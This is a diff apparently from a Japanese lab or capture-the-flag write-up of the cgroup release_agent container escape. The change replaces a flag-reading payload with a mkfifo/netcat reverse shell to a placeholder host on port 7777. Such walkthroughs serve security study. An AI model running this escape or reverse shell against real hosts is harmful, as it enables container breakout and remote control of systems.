@@ -309,7 +309,7 @@ echo "$host_path/exploit" > /tmp/cgrp/release_agent
 
 # 5,6,7. エクスプロイトコード
 echo '#!/bin/sh' > /exploit
-echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 7777 >/tmp/f" >> /exploit
 chmod a+x /exploit
 
 # 8. PID を書き込むと、そのプロセスが指定された cgroup に所属する。
